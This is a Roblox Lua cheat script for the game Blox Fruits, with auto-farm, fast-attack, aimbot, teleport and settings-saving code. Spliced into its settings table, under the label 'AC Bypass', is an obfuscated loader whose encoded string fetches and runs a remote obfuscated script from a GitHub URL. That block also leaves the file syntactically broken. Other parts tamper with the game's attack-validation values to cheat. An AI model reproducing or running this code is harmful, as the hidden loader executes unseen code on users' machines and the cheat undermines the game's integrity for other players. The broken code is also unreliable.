if game:GetService("ReplicatedStorage").Effect.Container:FindFirstChild("Death") then
	game:GetService("ReplicatedStorage").Effect.Container.Death:Destroy()
end
if game:GetService("ReplicatedStorage").Effect.Container:FindFirstChild("Respawn") then
	game:GetService("ReplicatedStorage").Effect.Container.Respawn:Destroy()
end
_G.Settings = {

// AC Bypass

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=v2(v0(v30,16));if v19 then local v89=0;local v90;while true do if (v89==1) then return v90;end if (v89==0) then v90=v5(v81,v19);v19=nil;v89=1;end end else return v81;end end end);local function v20(v31,v32,v33)if v33 then local v82=(v31/((5 -3)^(v32-1)))%((5 -3)^(((v33-1) -(v32-(1 -0))) + (2 -1))) ;return v82-(v82%(620 -(555 + 64))) ;else local v83=931 -(857 + 74) ;local v84;while true do if (v83==0) then v84=(570 -(367 + 201))^(v32-((2565 -(1523 + 114)) -(214 + 713))) ;return (((v31%(v84 + v84))>=v84) and (1 + 0)) or ((877 -(282 + 595)) + 0 + 0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + (1272 -(226 + 1044)) ;return (v36 * (364 -108)) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (12 -9) );v18=v18 + 4 ;return (v40 * ((16778290 -(892 + 65)) -(32 + 85))) + (v39 * ((153212 -88986) + 1310)) + (v38 * (57 + 199)) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,(1 + 0) -(0 -0) ,(36 + 0) -16 ) * ((352 -(87 + 263))^(212 -(67 + 113)))) + v41 ;local v45=v20(v42,21,23 + 8 );local v46=((v20(v42,78 -46 )==(1 + 0)) and  -(792 -(368 + 423))) or (3 -2) ;if (v45==(952 -(802 + 150))) then if (v44==(0 -0)) then return v46 * (0 -0) ;else local v91=0;while true do if (v91==(0 + 0)) then v45=998 -(915 + 82) ;v43=(0 -0) -0 ;break;end end end elseif (v45==(1193 + 854)) then return ((v44==0) and (v46 * ((1 -0)/(1187 -(1069 + 118))))) or (v46 * NaN) ;end return v8(v46,v45-(2320 -1297) ) * (v43 + (v44/((3 -1)^52))) ;end local function v25(v47)local v48;if  not v47 then local v85=18 -(10 + 8) ;while true do if (v85==0) then v47=v23();if (v47==(0 -0)) then return "";end break;end end end v48=v3(v16,v18,(v18 + v47) -(443 -(416 + 26)) );v18=v18 + v47 ;local v49={};for v64=3 -2 , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=0;local v51;local v52;local v53;local v54;local v55;local v56;local v57;while true do if (v50==(0 -0)) then v51=413 -(15 + 398) ;v52=nil;v50=1;end if (1==v50) then v53=nil;v54=nil;v50=984 -(18 + 964) ;end if (v50~=(11 -8)) then else v57=nil;while true do if (v51~=(1 + 0)) then else local v96=166 -(9 + 157) ;local v97;while true do if (v96==0) then v97=850 -(20 + 830) ;while true do if (v97==0) then local v149=0 -0 ;while true do if (v149==1) then v97=1825 -(1195 + 629) ;break;end if (v149~=(0 + 0)) then else v56=v23();v57={};v149=1 -0 ;end end end if (v97==(243 -(187 + 54))) then v51=1 + 1 ;break;end if ((739 -(542 + 196))==v97) then local v150=780 -(162 + 618) ;while true do if (v150~=0) then else for v164=1 + 0 ,v56 do local v165=0 + 0 ;local v166;local v167;local v168;while true do if ((0 + 0)==v165) then v166=0 -0 ;v167=nil;v165=1;end if (v165==1) then v168=nil;while true do if (v166==(0 -0)) then local v171=0 -0 ;while true do if (v171==0) then v167=v21();v168=nil;v171=1;end if (v171==(2 -1)) then v166=1;break;end end end if (v166==1) then if (v167==(1 + 0)) then v168=v21()~=(405 -(118 + 287)) ;elseif (v167==(1638 -(1373 + 263))) then v168=v24();elseif (v167~=(1003 -(451 + 549))) then else v168=v25();end v57[v164]=v168;break;end end break;end end end v55[11 -8 ]=v21();v150=1;end if ((1 + 0)~=v150) then else v97=2 -0 ;break;end end end end break;end end end if (v51~=2) then else local v98=0 -0 ;while true do if (v98==(1121 -(118 + 1003))) then for v129=1385 -(746 + 638) ,v23() do local v130=0 + 0 ;local v131;while true do if (v130==(377 -(142 + 235))) then v131=v21();if (v20(v131,1,1)~=(0 -0)) then else local v157=0 -0 ;local v158;local v159;local v160;local v161;local v162;local v163;while true do if (v157~=(980 -(553 + 424))) then else while true do if (v158==(342 -(218 + 123))) then local v169=0 + 0 ;while true do if (0==v169) then v161=nil;v162=nil;v169=1582 -(1535 + 46) ;end if (v169~=(1 + 0)) then else v158=1 + 1 ;break;end end end if (0==v158) then local v170=0 + 0 ;while true do if (v170==(1 + 0)) then v158=561 -(306 + 254) ;break;end if (v170==0) then v159=0 + 0 ;v160=nil;v170=1;end end end if (v158~=(4 -2)) then else v163=nil;while true do if (v159~=2) then else while true do if (v160~=2) then else local v175=0 -0 ;local v176;while true do if (v175==(0 -0)) then v176=0;while true do if (v176==(0 + 0)) then local v185=0 -0 ;while true do if (v185==(1468 -(899 + 568))) then v176=1;break;end if (v185~=0) then else if (v20(v162,1 + 0 ,2 -1 )~=1) then else v163[1 + 1 ]=v57[v163[1331 -(797 + 532) ]];end if (v20(v162,2 + 0 ,1 + 1 )==(604 -(268 + 335))) then v163[293 -(60 + 230) ]=v57[v163[3]];end v185=1203 -(373 + 829) ;end end end if (v176==(573 -(426 + 146))) then v160=1 + 2 ;break;end end break;end end end if ((2 + 1)==v160) then if (v20(v162,3,1459 -(282 + 1174) )~=(812 -(569 + 242))) then else v163[11 -7 ]=v57[v163[1 + 3 ]];end v52[v129]=v163;break;end if (v160==1) then local v178=0;local v179;local v180;while true do if (v178==(1024 -(706 + 318))) then v179=1251 -(721 + 530) ;v180=nil;v178=1272 -(945 + 326) ;end if (v178==(1 + 0)) then while true do if (v179~=(0 -0)) then else v180=0;while true do if (v180~=(2 -1)) then else v160=338 -(144 + 192) ;break;end if (v180==(0 + 0)) then local v186=700 -(271 + 429) ;while true do if (0~=v186) then else local v191=0 + 0 ;while true do if (v191~=(0 + 0)) then else v163={v22(),v22(),nil,nil};if (v161==(0 + 0)) then local v192=1171 -(418 + 753) ;while true do if (v192~=(0 + 0)) then else v163[1 + 2 ]=v22();v163[2 + 2 ]=v22();break;end end elseif (v161==(1 + 0)) then v163[3]=v23();elseif (v161==(1 + 1)) then v163[3]=v23() -(2^(545 -(406 + 123))) ;elseif (v161~=3) then else local v197=1769 -(1749 + 20) ;local v198;local v199;while true do if (v197==(1 + 0)) then while true do if (v198~=0) then else v199=1975 -(1913 + 62) ;while true do if (v199~=(0 + 0)) then else v163[7 -4 ]=v23() -(2^16) ;v163[4]=v22();break;end end break;end end break;end if (v197==0) then v198=0;v199=nil;v197=1 + 0 ;end end end v191=3 -2 ;end if (v191==(1662 -(1477 + 184))) then v186=1323 -(1249 + 73) ;break;end end end if (v186~=(1 + 0)) then else v180=857 -(564 + 292) ;break;end end end end break;end end break;end end end if (v160~=(0 + 0)) then else local v181=1145 -(466 + 679) ;local v182;while true do if ((0 -0)==v181) then v182=0 -0 ;while true do if (v182==1) then v160=305 -(244 + 60) ;break;end if (v182==0) then v161=v20(v131,2 + 0 ,479 -(41 + 435) );v162=v20(v131,1005 -(938 + 63) ,17 -11 );v182=1 + 0 ;end end break;end end end end break;end if (v159==(1900 -(106 + 1794))) then local v173=0;while true do if ((0 + 0)==v173) then v160=0;v161=nil;v173=1;end if (v173==1) then v159=1126 -(936 + 189) ;break;end end end if ((1 + 0)==v159) then local v174=0 -0 ;while true do if (v174==0) then v162=nil;v163=nil;v174=2 -1 ;end if (v174==(115 -(4 + 110))) then v159=586 -(57 + 527) ;break;end end end end break;end end break;end if ((1429 -(41 + 1386))==v157) then v162=nil;v163=nil;v157=3;end if (v157==(104 -(17 + 86))) then v160=nil;v161=nil;v157=1140 -(782 + 356) ;end if (v157==(0 + 0)) then v158=0 -0 ;v159=nil;v157=2 -1 ;end end end break;end end end for v132=167 -(122 + 44) ,v23() do v53[v132-(1 -0) ]=v28();end v98=1 -0 ;end if (1~=v98) then else return v55;end end end if (v51==(0 -0)) then local v99=0 + 0 ;local v100;while true do if (v99==0) then v100=0;while true do if (v100==(1877 -(157 + 1718))) then v51=1 + 0 ;break;end if (v100==(1 -0)) then local v151=0;while true do if (v151==1) then v100=6 -4 ;break;end if (v151==(65 -(30 + 35))) then v54={};v55={v52,v53,nil,v54};v151=3 -2 ;end end end if (v100==(1212 -(323 + 889))) then local v152=0 -0 ;while true do if (v152==(2 -1)) then v100=581 -(361 + 219) ;break;end if (v152~=(320 -(53 + 267))) then else v52={};v53={};v152=1;end end end end break;end end end end break;end if (v50~=(1 + 1)) then else v55=nil;v56=nil;v50=5 -2 ;end end end local function v29(v58,v59,v60)local v61=v58[1];local v62=v58[2];local v63=v58[3];return function(...)local v66=v61;local v67=v62;local v68=v63;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v86=0,v74 do if (v86>=v68) then v72[v86-v68 ]=v73[v86 + 1 ];else v76[v86]=v73[v86 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1];if (v79<=3) then if (v79<=1) then if (v79==0) then do return;end else local v101=0;local v102;local v103;local v104;local v105;while true do if (2==v101) then for v153=v102,v71 do v105=v105 + 1 ;v76[v153]=v103[v105];end break;end if (1==v101) then v71=(v104 + v102) -1 ;v105=0;v101=2;end if (v101==0) then v102=v78[2];v103,v104=v69(v76[v102](v13(v76,v102 + 1 ,v78[3])));v101=1;end end end elseif (v79>2) then if ((v78[3]=="_ENV") or (v78[3]=="getfenv")) then v76[v78[2]]=v60;else v76[v78[2]]=v60[v78[3]];end else v76[v78[2]]();end elseif (v79<=5) then if (v79>4) then local v106;local v107,v108;local v109;local v110;if ((v78[3]=="_ENV") or (v78[3]=="getfenv")) then v76[v78[2]]=v60;else v76[v78[2]]=v60[v78[3]];end v70=v70 + 1 ;v78=v66[v70];if ((v78[3]=="_ENV") or (v78[3]=="getfenv")) then v76[v78[2]]=v60;else v76[v78[2]]=v60[v78[3]];end v70=v70 + 1 ;v78=v66[v70];v110=v78[2];v109=v76[v78[3]];v76[v110 + 1 ]=v109;v76[v110]=v109[v78[4]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v110=v78[2];v107,v108=v69(v76[v110](v13(v76,v110 + 1 ,v78[3])));v71=(v108 + v110) -1 ;v106=0;for v126=v110,v71 do v106=v106 + 1 ;v76[v126]=v107[v106];end v70=v70 + 1 ;v78=v66[v70];v110=v78[2];v76[v110]=v76[v110](v13(v76,v110 + 1 ,v71));v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]();v70=v70 + 1 ;v78=v66[v70];do return;end else local v119=v78[2];v76[v119]=v76[v119](v13(v76,v119 + 1 ,v71));end elseif (v79>6) then local v121=0;local v122;local v123;while true do if (1==v121) then v76[v122 + 1 ]=v123;v76[v122]=v123[v78[4]];break;end if (v121==0) then v122=v78[2];v123=v76[v78[3]];v121=1;end end else v76[v78[2]]=v78[3];end v70=v70 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034E3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F73656B7274652O33342O352O342F526F626C6F782F6D61696E2F6E65772D6F6266757363617465642E6C756100083O0012053O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...)


	Main = {
		["Auto Farm Level"] = false,
		["Fast Auto Farm Level"] = false,

		--[Mob Aura]

		["Distance Mob Aura"] = 1000, -- {Max : 5000} 
		["Mob Aura"] = false,

		--[World 1]
		["Auto New World"] = false,
		["Auto Saber"] = false,
		["Auto Pole"] = false,

		["Auto Buy Ablility"] = false,

		--[World 2]
		["Auto Third Sea"] = false,
		["Auto Factory"] = false,
		["Auto Factory Hop"] = false,
		["Auto Bartilo Quest"] = false,

		["Auto True Triple Katana"] = false,
		["Auto Rengoku"] = false,
		["Auto Swan Glasses"] = false,
		["Auto Dark Coat"] = false,
		["Auto Ectoplasm"] = false,

		["Auto Buy Legendary Sword"] = false,
		["Auto Buy Enchanment Haki"] = false,

		--[World 3]
		["Auto Holy Torch"] = false,
		["Auto Buddy Swords"] = false,
		["Auto Farm Boss Hallow"] = false,
		["Auto Rainbow Haki"] = false,
		["Auto Elite Hunter"] = false,
		["Auto Musketeer Hat"] = false,
		["Auto Buddy Sword"] = false,
		["Auto Farm Bone"] = false,
		["Auto Ken-Haki V2"] = false,
		["Auto Cavander"] = false,
		["Auto Yama Sword"] = false,
		["Auto Tushita Sword"] = false,
		["Auto Serpent Bow"] = false,
		["Auto Dark Dagger"] = false,
		["Auto Cake Prince"] = false,
		["Auto Dough V2"] = false,
		["Auto Random Bone"] = false,

		--[For God Human]

		["Auto Fish Tail Sea 1"] = false,
		["Auto Fish Tail Sea 3"] = false,
		["Auto Magma Ore Sea 2"] = false,
		["Auto Magma Ore Sea 1"] = false,
		["Auto Mystic Droplet"] = false,
		["Auto Dragon Scales"] = false,

	},
	FightingStyle = {
		["Auto God Human"] = false,
		["Auto Superhuman"] = false,
		["Auto Electric Claw"] = false,
		["Auto Death Step"] = false,
		["Auto Fully Death Step"] = false,
		["Auto SharkMan Karate"] = false,
		["Auto Fully SharkMan Karate"] = false,
		["Auto Dragon Talon"] = false,
	},
	Boss = {
		["Auto All Boss"] = false,
		["Auto Boss Select"] = false,
		["Select Boss"] = {},

		["Auto Quest"] = false,
	},
	Mastery = {
		["Select Multi Sword"] = {},
		["Farm Mastery SwordList"] = false,
		["Auto Farm Fruit Mastery"] = false,
		["Auto Farm Gun Mastery"] = false,
		["Mob Health (%)"] = 15,
	},
	Configs = {
		["Double Quest"] = false,
		["Bypass TP"] = false,
		["Select Team"] = {"Pirate"}, --{Pirate,Marine}


		["Fast Attack"] = true,
		["Fast Attack Type"] = {"Fast"}, --{Normal,Fast,Slow}

		["Select Weapon"] = {},


		--[Misc Configs]
		["Auto Haki"] = true,
		["Distance Auto Farm"] = 20, --{Max : 50}
		["Camera Shaker"] = false,

		--[Skill Configs]
		["Skill Z"] = true,
		["Skill X"] = true,
		["Skill C"] = true,
		["Skill V"] = true,

		--[Mob Configs]
		["Show Hitbox"] = false,
		["Bring Mob"] = true,
		["Disabled Damage"] = false,

	},
	Stat = {
		--[Auto Stats]
		["Enabled Auto Stats"] = false,
		["Auto Stats Kaitun"] = false,

		["Select Stats"] = {"Melee"}, --{Max Stats,Melee,Defense,Sword,Devil Fruit,Gun}
		["Point Select"] = 3, --{Recommended , Max : 9}

		--[Auto Redeem Code]

		["Enabled Auto Redeem Code"] = false,
		["Select Level Redeem Code"] = 1, --{Max : 2400}
	},

	Misc = {
		["No Soru Cooldown"] = false,
		["No Dash Cooldown"] = false,

		["Infinities Geppo"] = false,
		["Infinities Energy"] = false,

		["No Fog"] = false,
		["Wall-TP"] = false,

		["Fly"] = false,
		["Fly Speed"] = 1,

		--[Server]
		["Auto Rejoin"] = true,
	},
	Teleport = {
		["Teleport to Sea Beast"] = false,
	},

	Fruits = {
		["Auto Buy Random Fruits"] = false,
		["Auto Store Fruits"] = false,

		["Select Devil Fruits"] = {}, -- {"Bomb-Bomb","Spike-Spike","Chop-Chop","Spring-Spring","Kilo-Kilo","Spin-Spin","Kilo-Kilo","Spin-Spin","Bird: Falcon","Smoke-Smoke","Flame-Flame","Ice-Ice","Sand-Sand","Dark-Dark","Revive-Revive","Diamond-Diamond","Light-Light","Love-Love","Rubber-Rubber","Barrier-Barrier","Magma-Magma","Door-Door","Quake-Quake","Human-Human: Buddha","String-String","Bird-Bird: Phoenix","Rumble-Rumble","Paw-Paw","Gravity-Gravity","Dough-Dough","Shadow-Shadow","Venom-Venom","Control-Control","Soul-Soul","Dragon-Dragon"}
		["Auto Buy Devil Fruits Sniper"] = false,
	},

	Raids = {
		["Auto Raids"] = false,

		["Kill Aura"] = false,
		["Auto Awakened"] = false,
		["Auto Next Place"] = false,

		["Select Raids"] = {}, -- {"Flame","Ice","Quake","Light","Dark","String","Rumble","Magma","Human: Buddha","Sand","Bird: Phoenix","Dough"},
	},

	Combat = {
		["Fov Size"] = 200,
		["Show Fov"] = false,
		["Aimbot Skill"] = false,
	},

	HUD = {
		["FPS"] = 60,
		["LockFPS"] = true,
		["Boost FPS Windows"] = false,
		['White Screen'] = false,
	},
	ConfigsUI = {
		ColorUI = Color3.fromRGB(255, 0, 127), --{Color UI}
	}
}
-- [require module]

local CombatFramework = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
local CombatFrameworkR = getupvalues(CombatFramework)[2]
local RigController = require(game:GetService("Players")["LocalPlayer"].PlayerScripts.CombatFramework.RigController)
local RigControllerR = getupvalues(RigController)[2]
local realbhit = require(game.ReplicatedStorage.CombatFramework.RigLib)
local cooldownfastattack = tick()
function getAllBladeHits(Sizes)
	local Hits = {}
	local Client = game.Players.LocalPlayer
	local Enemies = game:GetService("Workspace").Enemies:GetChildren()
	for i=1,#Enemies do local v = Enemies[i]
		local Human = v:FindFirstChildOfClass("Humanoid")
		if Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
			table.insert(Hits,Human.RootPart)
		end
	end
	return Hits
end
function CurrentWeapon()
	local ac = CombatFrameworkR.activeController
	local ret = ac.blades[1]
	if not ret then return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name end
	pcall(function()
		while ret.Parent~=game.Players.LocalPlayer.Character do ret=ret.Parent end
	end)
	if not ret then return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name end
	return ret
end
function AttackFunction()
	local ac = CombatFrameworkR.activeController
	if ac and ac.equipped then
		for indexincrement = 1, 1 do
			local bladehit = getAllBladeHits(60)
			if #bladehit > 0 then
				local AcAttack8 = debug.getupvalue(ac.attack, 5)
				local AcAttack9 = debug.getupvalue(ac.attack, 6)
				local AcAttack7 = debug.getupvalue(ac.attack, 4)
				local AcAttack10 = debug.getupvalue(ac.attack, 7)
				local NumberAc12 = (AcAttack8 * 798405 + AcAttack7 * 727595) % AcAttack9
				local NumberAc13 = AcAttack7 * 798405
				(function()
					NumberAc12 = (NumberAc12 * AcAttack9 + NumberAc13) % 1099511627776
					AcAttack8 = math.floor(NumberAc12 / AcAttack9)
					AcAttack7 = NumberAc12 - AcAttack8 * AcAttack9
				end)()
				AcAttack10 = AcAttack10 + 1
				debug.setupvalue(ac.attack, 5, AcAttack8)
				debug.setupvalue(ac.attack, 6, AcAttack9)
				debug.setupvalue(ac.attack, 4, AcAttack7)
				debug.setupvalue(ac.attack, 7, AcAttack10)
				for k, v in pairs(ac.animator.anims.basic) do
					v:Play(0.01,0.01,0.01)
				end                 
				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and ac.blades and ac.blades[1] then 
					game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(CurrentWeapon()))
					game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(NumberAc12 / 1099511627776 * 16777215), AcAttack10)
					game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", bladehit, 2, "") 
				end
			end
		end
	end
end
local EnemySpawns = Instance.new("Folder",workspace)
EnemySpawns.Name = "EnemySpawns"

for i, v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
if v:IsA("Part") then
	local EnemySpawnsX2 = v:Clone()
	local result = string.gsub(v.Name, "Lv. ", "")
	local result2 = string.gsub(result, "[%[%]]", "")
	local result3 = string.gsub(result2, "%d+", "")
	local result4 = string.gsub(result3, "%s+", "")
	EnemySpawnsX2.Name = result4
	EnemySpawnsX2.Parent = workspace.EnemySpawns
	EnemySpawnsX2.Anchored = true
end
end
for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart") then
	print(v.HumanoidRootPart.Parent)
	local EnemySpawnsX2 = v.HumanoidRootPart:Clone()
	local result = string.gsub(v.Name, "Lv. ", "")
	local result2 = string.gsub(result, "[%[%]]", "")
	local result3 = string.gsub(result2, "%d+", "")
	local result4 = string.gsub(result3, "%s+", "")

	print(result4)
	EnemySpawnsX2.Name = result4
	EnemySpawnsX2.Parent = workspace.EnemySpawns
	EnemySpawnsX2.Anchored = true
end
end
for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart") then
	local EnemySpawnsX2 = v.HumanoidRootPart:Clone()
	local result = string.gsub(v.Name, "Lv. ", "")
	local result2 = string.gsub(result, "[%[%]]", "")
	local result3 = string.gsub(result2, "%d+", "")
	local result4 = string.gsub(result3, "%s+", "")

	print(result4)
	EnemySpawnsX2.Name = result4
	EnemySpawnsX2.Parent = workspace.EnemySpawns
	EnemySpawnsX2.Anchored = true
end
end
function LoadSettings()
	if readfile and writefile and isfile and isfolder then
		if not isfolder("Silver Hub Premium Scripts") then
			makefolder("Silver Hub Premium Scripts")
		end
		if not isfolder("Silver Hub Premium Scripts/Blox Fruits/") then
			makefolder("Silver Hub Premium Scripts/Blox Fruits/")
		end
		if not isfile("Silver Hub Premium Scripts/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json") then
			writefile("Silver Hub Premium Scripts/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json", game:GetService("HttpService"):JSONEncode(_G.Settings))
		else
			local Decode = game:GetService("HttpService"):JSONDecode(readfile("Silver Hub Premium Scripts/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json"))
			for i,v in pairs(Decode) do
				_G.Settings[i] = v
			end
		end
	else
		return warn("Status : Undetected Executor")
	end
end

function SaveSettings()
	if readfile and writefile and isfile and isfolder then
		if not isfile("Silver Hub Premium Scripts/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json") then
			LoadSettings()
		else
			local Decode = game:GetService("HttpService"):JSONDecode(readfile("Silver Hub Premium Scripts/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json"))
			local Array = {}
			for i,v in pairs(_G.Settings) do
				Array[i] = v
			end
			writefile("Silver Hub Premium Scripts/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json", game:GetService("HttpService"):JSONEncode(Array))
		end
	else
		return warn("Status : Undetected Executor")
	end
end

LoadSettings()



------------ // AutoUpdate \\ ------------
spawn(function()
while wait() do
	if _G.AutoFarmLevelReal then
		FastAttack = true
	else
		FastAttack = false
	end
end
end)
local function QuestCheck()
	local Lvl = game:GetService("Players").LocalPlayer.Data.Level.Value
	if Lvl >= 1 and Lvl <= 9 then
		if tostring(game.Players.LocalPlayer.Team) == "Marines" then
			MobName = "Trainee [Lv. 5]"
			QuestName = "MarineQuest"
			QuestLevel = 1
			Mon = "Trainee"
			NPCPosition = CFrame.new(-2709.67944, 24.5206585, 2104.24585, -0.744724929, -3.97967455e-08, -0.667371571, 4.32403588e-08, 1, -1.07884304e-07, 0.667371571, -1.09201515e-07, -0.744724929)
		elseif tostring(game.Players.LocalPlayer.Team) == "Pirates" then
			MobName = "Bandit [Lv. 5]"
			Mon = "Bandit"
			QuestName = "BanditQuest1"
			QuestLevel = 1
			NPCPosition = CFrame.new(1059.99731, 16.9222069, 1549.28162, -0.95466274, 7.29721794e-09, 0.297689587, 1.05190106e-08, 1, 9.22064114e-09, -0.297689587, 1.19340022e-08, -0.95466274)
		end
		return {
			[1] = QuestLevel,
			[2] = NPCPosition,
			[3] = MobName,
			[4] = QuestName,
			[5] = LevelRequire,
			[6] = Mon,
			[7] = MobCFrame
		}
	end
	
	if Lvl >= 210 and Lvl <= 249 then
		MobName = "Dangerous Prisoner [Lv. 210]"
		QuestName = "PrisonerQuest"
		QuestLevel = 2
		Mon = "Dangerous Prisoner"
		NPCPosition = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
		local matchingCFrames = {}
		local result = string.gsub(MobName, "Lv. ", "")
		local result2 = string.gsub(result, "[%[%]]", "")
		local result3 = string.gsub(result2, "%d+", "")
		local result4 = string.gsub(result3, "%s+", "")
		
		for i,v in pairs(game.workspace.EnemySpawns:GetChildren()) do
			if v.Name == result4 then
				table.insert(matchingCFrames, v.CFrame)
			end
			MobCFrame = matchingCFrames
		end
		return {
			[1] = QuestLevel,
			[2] = NPCPosition,
			[3] = MobName,
			[4] = QuestName,
			[5] = LevelRequire,
			[6] = Mon,
			[7] = MobCFrame
		}
	end
	
	--game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
	local GuideModule = require(game:GetService("ReplicatedStorage").GuideModule)
	local Quests = require(game:GetService("ReplicatedStorage").Quests)
	for i,v in pairs(GuideModule["Data"]["NPCList"]) do
		for i1,v1 in pairs(v["Levels"]) do
			if Lvl >= v1 then
				if not LevelRequire then
					LevelRequire = 0
				end
				if v1 > LevelRequire then
					NPCPosition = i["CFrame"]
					QuestLevel = i1
					LevelRequire = v1
				end
				if #v["Levels"] == 3 and QuestLevel == 3 then
					NPCPosition = i["CFrame"]
					QuestLevel = 2
					LevelRequire = v["Levels"][2]
				end
			end
		end
	end
	if Lvl >= 375 and Lvl <= 399 then -- Fishman Warrior
		MobCFrame = CFrame.new(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
		if _G.StartFarm and (MobCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
			game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
			return
		end
	end
	
	if Lvl >= 400 and Lvl <= 449 then -- Fishman Commando
		MobCFrame = CFrame.new(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
		if _G.StartFarm and (MobCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
			game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
			return
		end
	end
	for i,v in pairs(Quests) do
		for i1,v1 in pairs(v) do
			if v1["LevelReq"] == LevelRequire and i ~= "CitizenQuest" then
				QuestName = i
				for i2,v2 in pairs(v1["Task"]) do
					MobName = i2
					Mon = string.split(i2," [Lv. ".. v1["LevelReq"] .. "]")[1]
				end
			end
		end
	end
	if QuestName == "MarineQuest2" then
		QuestName = "MarineQuest2"
		QuestLevel = 1
		MobName = "Chief Petty Officer [Lv. 120]"
		Mon = "Chief Petty Officer"
		LevelRequire = 120
	elseif QuestName == "ImpelQuest" then
		QuestName = "PrisonerQuest"
		QuestLevel = 2
		MobName = "Dangerous Prisoner [Lv. 190]"
		Mon = "Dangerous Prisoner"
		LevelRequire = 210
		NPCPosition = CFrame.new(5310.60547, 0.350014925, 474.946594, 0.0175017118, 0, 0.999846935, 0, 1, 0, -0.999846935, 0, 0.0175017118)
	elseif QuestName == "SkyExp1Quest" then
		if QuestLevel == 1 then
			NPCPosition = CFrame.new(-4721.88867, 843.874695, -1949.96643, 0.996191859, -0, -0.0871884301, 0, 1, -0, 0.0871884301, 0, 0.996191859)
		elseif QuestLevel == 2 then
			NPCPosition = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998)
		end
	elseif QuestName == "Area2Quest" and QuestLevel == 2 then
		QuestName = "Area2Quest"
		QuestLevel = 1
		MobName = "Swan Pirate [Lv. 775]"
		Mon = "Swan Pirate"
		LevelRequire = 775
	end
	MobName = MobName:sub(1,#MobName)
	if not MobName:find("Lv") then
		for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
			MonLV = string.match(v.Name, "%d+")
			if v.Name:find(MobName) and #v.Name > #MobName and tonumber(MonLV) <= Lvl + 50 then
				MobName = v.Name
			end
		end
	end
	if not MobName:find("Lv") then
		for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
			MonLV = string.match(v.Name, "%d+")
			if v.Name:find(MobName) and #v.Name > #MobName and tonumber(MonLV) <= Lvl + 50 then
				MobName = v.Name
				Mon = a
			end
		end
	end
	
	local matchingCFrames = {}
	local result = string.gsub(MobName, "Lv. ", "")
	local result2 = string.gsub(result, "[%[%]]", "")
	local result3 = string.gsub(result2, "%d+", "")
	local result4 = string.gsub(result3, "%s+", "")
	
	for i,v in pairs(game.workspace.EnemySpawns:GetChildren()) do
		if v.Name == result4 then
			table.insert(matchingCFrames, v.CFrame)
		end
		MobCFrame = matchingCFrames
	end
	
	return {
		[1] = QuestLevel,
		[2] = NPCPosition,
		[3] = MobName,
		[4] = QuestName,
		[5] = LevelRequire,
